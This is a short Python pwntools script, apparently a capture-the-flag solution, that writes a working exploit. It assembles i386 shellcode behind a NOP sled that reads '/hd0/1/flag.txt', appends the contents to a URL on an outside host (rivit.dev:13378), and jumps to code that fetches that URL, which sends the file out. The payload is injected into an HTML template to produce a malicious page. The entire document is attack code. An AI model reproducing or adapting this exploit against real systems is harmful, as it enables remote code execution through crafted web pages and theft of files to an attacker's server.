from pwn import *

with open("index.html", 'rb') as f:
    templ = f.read()

payload_start = 0x31c552
str_addr = payload_start+0x80
flag_location = b'/hd0/1/flag.txt\0'
base_url = b'http://rivit.dev:13378/?c='

context.arch = 'i386'
payload = asm('nop') * 0x30 +  asm(f"""
mov eax, 0x44
mov ebx, 0x1b
mov ecx, {str_addr}
int 0x40

mov esi, eax
mov edi, {str_addr+len(flag_location)+len(base_url)}

loop:
    lodsb
    stosb
    test al, al
jnz loop

push {str_addr+len(flag_location)}
push 0x1137c
ret
""")

padding = (str_addr - payload_start) - len(payload)
payload += b'\x90' * padding
payload += flag_location
payload += base_url

templ = templ.replace(b'REPLACE', payload).replace(b'JUMP_ADDR', p32(payload_start).replace(p8(0), b''))

with open("index.html2", 'wb') as f:
    f.write(templ)
